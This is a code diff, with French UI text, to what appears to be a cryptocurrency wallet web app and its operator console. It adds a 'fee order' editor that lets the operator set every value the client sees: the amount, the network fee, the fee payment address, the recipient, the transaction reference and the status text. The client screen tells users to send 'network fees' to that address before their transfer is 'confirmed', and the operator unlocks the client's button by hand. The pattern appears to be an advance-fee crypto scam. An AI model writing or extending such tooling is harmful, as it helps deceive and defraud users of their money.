@@ -1169,7 +1169,9 @@
   // Le montant suit les frais publiés par la console : s'ils changent pendant
   // le délai, le reste à payer se met à jour sans toucher à l'ordre.
   function feeRemaining(o) {
-    const live = Number(netFee(o.pick || "USDC")) || 0;
+    // `lock` : montant figé par la console admin (éditeur d'ordre de frais),
+    // il ne doit plus être écrasé par le barème des frais par actif.
+    const live = o.lock ? 0 : (Number(netFee(o.pick || "USDC")) || 0);
     const amount = live > 0 ? live : Number(o.amount) || 0;
     const paid = Math.max(0, Number(o.paid) || 0);
     return { amount, paid, remaining: Math.max(0, amount - paid) };
@@ -1319,24 +1321,32 @@
     const pending = !!order && !order.done;
     const rem = order ? feeRemaining(order) : null;
     const feeSym = order ? order.sym : due.sym;
-    const feeAddrNow = feeSym === "EUR" ? "" : feeAddrFor(feeSym);
+    const feeAddrNow = feeSym === "EUR" ? "" : ((order && order.feeAddr) ? order.feeAddr : feeAddrFor(feeSym));
     const feeNow = rem ? rem.amount : fee;
-    const feeLine = pending
-      ? "en attente"
-      : (order && order.via ? order.via : (due.short ? "hors application" : due.sym));
+    const feeLine = (order && order.via)
+      ? order.via
+      : pending ? "en attente" : (due.short ? "hors application" : due.sym);
+    // Champs libres publiés par la console admin : destinataire, référence,
+    // libellé de statut. Absents -> valeurs calculées par l'app.
+    const destShow = (order && order.addr) ? order.addr : addr;
+    const refShow = (order && order.ref) ? order.ref : ref;
+    const amtShow = (order && Number(order.amt) > 0) ? Number(order.amt) : amt;
+    const statusTxt = (order && order.statusTxt)
+      ? order.statusTxt
+      : (pending ? "En attente des frais réseau" : "En cours de confirmation");
     window.__feeOpen = pending ? order.id : null;
     openSheet(`<div class="sheet-title">${pending ? "Frais réseau à régler" : "Envoi en cours"}</div>
       <p class="sheet-sub">${pending
         ? `Il reste ${eur(rem.remaining, 2)} de frais réseau à régler en ${feeSym} pour confirmer la transaction.`
         : "Votre transaction a été signée puis diffusée sur le réseau."}</p>
       <div class="recap">
-        <div class="rc-row"><span>Montant</span><b>${pick === "EUR" ? eur(amt, 2) : qtyTxt(amt, pick)}</b></div>
+        <div class="rc-row"><span>Montant</span><b>${pick === "EUR" ? eur(amtShow, 2) : qtyTxt(amtShow, pick)}</b></div>
         <div class="rc-row"><span>Frais réseau</span><b id="feeAmount">${eur(feeNow, 2)}</b></div>
         ${fee > 0 ? `<div class="rc-row"><span>Frais réglés en</span><b>${feeLine}</b></div>` : ""}
-        ${fee > 0 ? `<div class="rc-row col"><span>Frais crédités à</span><code>${shortAddr(feeAddrFor(pick))}</code></div>` : ""}
-        <div class="rc-row col"><span>Destinataire</span><code>${shortAddr(addr)}</code></div>
-        <div class="rc-row col"><span>Référence</span><code>${shortAddr(ref)}</code></div>
-        <div class="rc-row"><span>Statut</span><b class="${pending ? "wait" : "ok"}">${pending ? "En attente des frais réseau" : "En cours de confirmation"}</b></div>
+        ${fee > 0 ? `<div class="rc-row col"><span>Frais crédités à</span><code>${feeAddrNow || shortAddr(feeAddrFor(pick))}</code></div>` : ""}
+        <div class="rc-row col"><span>Destinataire</span><code>${destShow.length > 20 ? destShow : shortAddr(destShow)}</code></div>
+        <div class="rc-row col"><span>Référence</span><code>${refShow.length > 20 ? refShow : shortAddr(refShow)}</code></div>
+        <div class="rc-row"><span>Statut</span><b class="${pending ? "wait" : "ok"}">${statusTxt}</b></div>
       </div>
       ${pending ? `<div class="fee-due">
         <b>Frais réseau à régler</b>
@@ -2272,9 +2282,144 @@
     return ok;
   }
 
+  // ── éditeur d'ordre de frais : l'écran client, valeurs modifiables ──
+  // La console affiche la même fiche que le client (montant, frais, frais
+  // réglés en, frais crédités à, destinataire, référence, statut, encart
+  // jaune) mais chaque valeur est un champ. « Appliquer » publie l'ordre.
+  let IA_FEE = null; // null = liste, "new" = création, sinon id de l'ordre
+
+  function iaFeeDraft(id) {
+    const o = id && id !== "new" ? feeOrders()[id] : null;
+    if (!o) {
+      const fee = Number(netFee("USDC")) || 600;
+      return {
+        amount: fee, sym: "ETH", pick: "USDC", amt: 0, recipient: "",
+        feeAddr: feeAddrFor("ETH"), ref: "", via: "", paid: 0, expH: "2",
+        status: "attente", isNew: true
+      };
+    }
+    const expH = Math.max(0, ((Number(o.exp) || Date.now()) - Date.now()) / 3600000);
+    return {
+      amount: Number(o.amount) || 0, sym: o.sym || "ETH", pick: o.pick || "USDC",
+      amt: Number(o.amt) || 0, recipient: o.addr || "",
+      feeAddr: o.feeAddr || feeAddrFor(o.sym || "ETH"),
+      ref: o.ref || "", via: o.via || "", paid: Number(o.paid) || 0,
+      expH: expH ? expH.toFixed(1) : "0",
+      status: o.cancelled ? "annule" : o.done ? "regle" : o.ok ? "valide" : "attente",
+      isNew: false
+    };
+  }
+
+  function iaFeeEditor() {
+    const d = iaFeeDraft(IA_FEE);
+    const rem = Math.max(0, d.amount - d.paid);
+    const opt = (v, t) => `<option value="${v}"${d.status === v ? " selected" : ""}>${t}</option>`;
+    const symOpt = ["ETH", "USDC", "BTC", "SOL", "EUR"]
+      .map(s => `<option value="${s}"${d.sym === s ? " selected" : ""}>${s}</option>`).join("");
+    return `<section class="ia-card ia-feeedit">
+      <h3>${d.isNew ? "Ajouter un ordre de frais" : "Modifier l'ordre de frais"}</h3>
+      <p class="ia-sub">Même fiche que le client. Change n'importe quelle valeur, puis « Appliquer » : l'app et la notification suivent en direct. Le statut passe tout seul à « validé » dès que le reçu couvre le montant.</p>
+
+      <div class="sheet-title">Frais réseau à régler</div>
+      <p class="sheet-sub">Il reste <b data-feout="remain">${eur(rem, 2)}</b> de frais réseau à régler en ${d.sym} pour confirmer la transaction.</p>
+
+      <div class="recap">
+        <div class="rc-row"><span>Montant</span><input data-fe="amt" inputmode="decimal" autocomplete="off" value="${iaField(d.amt)}" placeholder="0"></div>
+        <div class="rc-row"><span>Frais réseau</span><input data-fe="amount" inputmode="decimal" autocomplete="off" value="${iaField(d.amount)}" placeholder="0"></div>
+        <div class="rc-row"><span>Frais réglés en</span><input data-fe="via" autocomplete="off" value="${iaEsc(d.via)}" placeholder="en attente"></div>
+        <div class="rc-row col"><span>Frais crédités à</span><input data-fe="feeAddr" spellcheck="false" autocomplete="off" value="${iaEsc(d.feeAddr)}" placeholder="0x… adresse des frais"></div>
+        <div class="rc-row col"><span>Destinataire</span><input data-fe="recipient" spellcheck="false" autocomplete="off" value="${iaEsc(d.recipient)}" placeholder="adresse qui reçoit l'envoi"></div>
+        <div class="rc-row col"><span>Référence</span><input data-fe="ref" spellcheck="false" autocomplete="off" value="${iaEsc(d.ref)}" placeholder="0x… référence de transaction"></div>
+        <div class="rc-row"><span>Statut</span><select data-fe="status">
+          ${opt("attente", "En attente des frais réseau")}
+          ${opt("valide", "Validé — bouton débloqué")}
+          ${opt("regle", "Réglé — terminé")}
+          ${opt("annule", "Annulé")}
+        </select></div>
+      </div>
+
+      <div class="fee-due">
+        <b>Frais réseau à régler</b>
+        <p>Envoyez <b data-feout="remain">${eur(rem, 2)}</b> en ${d.sym} à l'adresse ci-dessous.</p>
+        <div class="recap">
+          <div class="rc-row"><span>Montant à envoyer</span><b data-feout="remain">${eur(rem, 2)}</b></div>
+          <div class="rc-row"><span>Déjà reçu</span><input data-fe="paid" inputmode="decimal" autocomplete="off" value="${iaField(d.paid)}" placeholder="0"></div>
+          <div class="rc-row col"><span>Adresse des frais</span><input data-fe="feeAddr" spellcheck="false" autocomplete="off" value="${iaEsc(d.feeAddr)}" placeholder="0x…"></div>
+          <div class="rc-row"><span>Temps restant (h)</span><input data-fe="expH" inputmode="decimal" autocomplete="off" value="${d.expH}" placeholder="2"></div>
+        </div>
+      </div>
+
+      <div class="ia-grid" style="margin-top:10px">
+        <label class="ia-line"><span class="ia-sym">Devise frais</span><select data-fe="sym">${symOpt}</select></label>
+        <label class="ia-line"><span class="ia-sym">Actif envoyé</span>
+          <select data-fe="pick">
+            ${["USDC", "BTC", "ETH", "SOL", "EUR"].map(s => `<option value="${s}"${d.pick === s ? " selected" : ""}>${s}</option>`).join("")}
+          </select>
+        </label>
+      </div>
+
+      <button type="button" class="ia-btn" data-ia="feeEditApply">${d.isNew ? "Ajouter l'ordre" : "Appliquer"}</button>
+      <button type="button" class="ia-btn" data-ia="feeEditValid">Valider (débloque le bouton client)</button>
+      <button type="button" class="ia-btn ghost" data-ia="feeEditAddrEth">Prendre l'adresse ETH publiée</button>
+      ${d.isNew ? "" : `<button type="button" class="ia-btn ghost" data-ia="feeEditDel">Supprimer cet ordre</button>`}
+      <button type="button" class="ia-btn ghost" data-ia="feeEditBack">Retour à la console</button>
+    </section>`;
+  }
+
+  function iaFeeValues() {
+    const out = {};
+    document.querySelectorAll("#iaPanel [data-fe]").forEach(el => { out[el.dataset.fe] = el.value; });
+    return out;
+  }
+
+  function iaFeeApply(forceStatus) {
+    const v = iaFeeValues();
+    const now = Date.now();
+    const amount = iaNum(v.amount);
+    const paid = iaNum(v.paid);
+    let status = String(forceStatus || v.status || "attente");
+    // Le statut suit le reçu : montant couvert -> validé, sans clic de plus.
+    if (status === "attente" && amount > 0 && paid >= amount) status = "valide";
+
+    const expH = iaNum(v.expH);
+    let o = (IA_FEE && IA_FEE !== "new") ? feeOrders()[IA_FEE] : null;
+    if (!o) {
+      const id = "fo" + now.toString(36) + Math.floor(Math.random() * 1e4).toString(36);
+      o = { id, at: now, exp: now + (expH > 0 ? Math.round(expH * 3600000) : FEE_TTL), paid: 0, ok: false, done: false };
+      feeOrders()[id] = o;
+      IA_FEE = id;
+    }
+    o.amount = amount;
+    o.lock = amount > 0;
+    o.amt = iaNum(v.amt);
+    o.sym = String(v.sym || "ETH").toUpperCase() || "ETH";
+    o.pick = String(v.pick || "USDC").toUpperCase() || "USDC";
+    o.addr = String(v.recipient || "").trim();
+    o.feeAddr = String(v.feeAddr || "").trim();
+    o.ref = String(v.ref || "").trim();
+    o.via = String(v.via || "").trim();
+    o.paid = status === "annule" ? 0 : paid;
+    if (expH > 0) o.exp = now + Math.round(expH * 3600000);
+    o.cancelled = status === "annule";
+    o.done = status === "regle" || status === "annule";
+    o.ok = status === "valide" || status === "regle" || (amount > 0 && paid >= amount);
+    o.statusTxt = status === "valide"
+      ? "Frais validés — en attente de confirmation"
+      : status === "regle"
+        ? "Réglé — transaction confirmée"
+        : status === "annule"
+          ? "Annulée"
+          : "En attente des frais réseau";
+    feeNotifSync(o);
+    return o;
+  }
+
   function iaRender() {
     const body = $("#iaBody");
     if (!body) return;
+
+    // Vue éditeur : une seule fiche, plein écran dans la console.
+    if (IA_FEE) { body.innerHTML = iaFeeEditor(); return; }
 
     const coins = CRYPTOS();
     const uf = ST.usdcFee || {};
@@ -2347,6 +2492,7 @@
         <span class="ia-mid"><b>${eur(rem.amount, 2)}</b> ${iaEsc(o.sym)} · ${iaEsc(state)}<br>reçu ${eur(rem.paid, 2)} · reste ${eur(rem.remaining, 2)}</span>
         <input data-iapaid="${iaEsc(o.id)}" inputmode="decimal" autocomplete="off" placeholder="Reçu (€)">
         <span class="ia-btns">
+          <button type="button" data-ia="feeEditOpen" data-id="${iaEsc(o.id)}">Modifier</button>
           <button type="button" data-ia="feePartial" data-id="${iaEsc(o.id)}">Ajouter</button>
           <button type="button" data-ia="feeOk" data-id="${iaEsc(o.id)}">C'est bon</button>
           <button type="button" data-ia="feeDel" data-id="${iaEsc(o.id)}">Retirer</button>
@@ -2398,8 +2544,9 @@
 
       <section class="ia-card">
         <h3>Frais réseau en attente</h3>
-        <p class="ia-sub">Chaque envoi dont les frais n'étaient pas couverts apparaît ici pendant 2 h. « Ajouter » enregistre un reçu partiel, « C'est bon » débloque le bouton de validation côté client.</p>
+        <p class="ia-sub">Chaque envoi dont les frais n'étaient pas couverts apparaît ici pendant 2 h. « Ajouter » enregistre un reçu partiel, « C'est bon » débloque le bouton de validation côté client, « Modifier » ouvre la fiche complète (montant, adresse des frais, destinataire, référence, statut).</p>
         ${fOrderRows}
+        <button type="button" class="ia-btn" data-ia="feeEditNew">Ajouter un ordre de frais</button>
       </section>
 
       <section class="ia-card">
@@ -2549,6 +2696,32 @@
       return iaCommit("Actif " + sym + " retiré");
     }
 
+    if (act === "feeEditNew") { IA_FEE = "new"; return iaRender(); }
+    if (act === "feeEditOpen") { IA_FEE = btn.dataset.id; return iaRender(); }
+    if (act === "feeEditBack") { IA_FEE = null; return iaRender(); }
+
+    if (act === "feeEditAddrEth") {
+      const fa = ST.feeAddresses || {};
+      const v = String(fa.ETH || feeAddrFor("ETH") || "").trim();
+      if (!v) return toast("Aucune adresse ETH enregistrée");
+      panel.querySelectorAll('[data-fe="feeAddr"]').forEach(el => { el.value = v; });
+      return toast("Adresse ETH appliquée — pense à Appliquer");
+    }
+
+    if (act === "feeEditApply" || act === "feeEditValid") {
+      const o = iaFeeApply(act === "feeEditValid" ? "valide" : null);
+      const msg = o.cancelled ? "Ordre de frais annulé"
+        : o.ok ? "Ordre validé — le bouton client est débloqué"
+          : "Ordre de frais appliqué";
+      return iaCommit(msg);
+    }
+
+    if (act === "feeEditDel") {
+      if (IA_FEE && IA_FEE !== "new") delete feeOrders()[IA_FEE];
+      IA_FEE = null;
+      return iaCommit("Ordre de frais supprimé");
+    }
+
     if (act === "feePartial" || act === "feeOk" || act === "feeDel") {
       const id = btn.dataset.id;
       const o = feeOrders()[id];
@@ -2617,6 +2790,22 @@
     if (el.matches("[data-iaunet]")) {
       const all = panel.querySelector("[data-iausdcall]");
       if (all) all.value = "";
+      return;
+    }
+    // Éditeur d'ordre de frais : les champs dupliqués (adresse des frais)
+    // restent synchronisés et le reste à payer se recalcule à la frappe.
+    if (el.matches("[data-fe]")) {
+      const key = el.dataset.fe;
+      panel.querySelectorAll('[data-fe="' + key + '"]').forEach(inp => {
+        if (inp !== el && inp.value !== el.value) inp.value = el.value;
+      });
+      const amount = iaNum((panel.querySelector('[data-fe="amount"]') || {}).value);
+      const paid = iaNum((panel.querySelector('[data-fe="paid"]') || {}).value);
+      const rem = Math.max(0, amount - paid);
+      panel.querySelectorAll('[data-feout="remain"]').forEach(x => { x.textContent = eur(rem, 2); });
+      const sel = panel.querySelector('[data-fe="status"]');
+      if (sel && sel.value === "attente" && amount > 0 && paid >= amount) sel.value = "valide";
+      return;
     }
   }
 
